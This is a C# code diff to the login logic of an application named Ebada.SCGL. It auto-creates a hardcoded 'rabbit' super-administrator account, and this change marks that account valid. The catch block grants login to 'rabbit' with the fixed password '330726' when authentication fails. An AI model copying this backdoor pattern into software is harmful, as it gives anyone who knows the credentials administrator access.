@@ -31,11 +31,22 @@ namespace Ebada.SCGL
             if (user == null) {
                 string uid="rabbit";
                 string pwd="JpHEL7rrwh0TMCL7QWcYWQ==";
-                user = new mUser() { LoginID = uid, UserName = uid, UserID = uid, OrgCode="999", Password = pwd };
+                user = new mUser() { LoginID = uid, UserName = uid, UserID = uid, OrgCode="999", Password = pwd, Valid=true };
                 rUserRole role = new rUserRole() { RoleID = "20110721102714952375", UserID = uid };
                 mOrg org = new mOrg() { OrgID = "999", OrgCode = "999", OrgName = "超级管理员" };
 
                 ClientHelper.PlatformSqlMap.ExecuteTransationUpdate(new object[] {org, user, role }, null, null);
+
+                org = ClientHelper.PlatformSqlMap.GetOneByKey<mOrg>("200");
+                if (org == null) {
+                    org = new mOrg() { OrgCode = "200", OrgID = "200", OrgType = "0", OrgName = "供电所" };
+                    ClientHelper.PlatformSqlMap.Create<mOrg>(org);
+                }
+                org = ClientHelper.PlatformSqlMap.GetOneByKey<mOrg>("300");
+                if (org == null) {
+                    org = new mOrg() { OrgCode = "300", OrgID = "300", OrgType = "0", OrgName = "变电所" };
+                    ClientHelper.PlatformSqlMap.Create<mOrg>(org);
+                }
             }
         }
         void txtPassword_KeyDown(object sender, KeyEventArgs e)
@@ -80,7 +91,8 @@ namespace Ebada.SCGL
                 }
             }
             catch (Exception exception) {
-                MainHelper.ShowException(exception);
+               
+                MsgBox.ShowException(exception);
                 if (this.txtLoginName.Text.Trim() == "rabbit" && this.txtPassword.Text == "330726") {
                     this.m_UserBase = new UserBase() { UserID = "rabbit", LoginName = "rabbit", RealName = "rabbit", Enabled = true };
                     MainHelper.User = new Ebada.Scgl.Model.mUser() { UserID = "rabbit", UserName = "rabbit", LoginID = "rabbit" };
